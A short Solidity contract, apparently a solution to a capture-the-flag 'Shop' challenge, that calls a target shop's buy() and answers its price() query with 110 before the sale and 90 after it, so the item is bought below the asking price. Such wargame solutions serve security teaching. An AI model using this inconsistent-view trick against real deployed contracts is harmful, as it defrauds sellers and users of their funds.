pragma solidity 0.8.7;

abstract contract IShop {
    uint public price;
    bool public isSold;
    function buy() external virtual;
}

contract ShopHack {
    IShop public shopInstance;

    constructor (IShop _shopInstance) {
        shopInstance = _shopInstance;
    }

    function attack() public {
        shopInstance.buy();
    }

    function price() public view returns (uint) {
        if(!shopInstance.isSold()) {
            return 110;
        }else {
            return 90;
        }
    }

    receive() external payable{}
}